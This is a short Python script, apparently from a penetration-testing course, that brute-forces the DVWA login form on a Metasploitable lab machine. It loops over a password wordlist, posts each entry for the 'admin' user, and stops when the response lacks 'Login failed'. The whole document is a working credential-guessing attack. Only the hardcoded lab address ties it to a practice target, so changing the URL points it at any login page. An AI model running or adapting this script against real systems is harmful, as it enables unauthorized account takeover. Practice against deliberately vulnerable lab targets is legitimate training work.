#!/usr/bin/env python

import requests

# Address Metasploitable
target_url = "http://10.0.2.20/dvwa/login.php"

data_dict = {
    "username": "admin",
    "password": "",
    "Login": "submit"
}

with open("passwords.txt", "r") as word_list:
    for line in word_list:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        # py3 if b"Login failed" not in response.content:
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line")
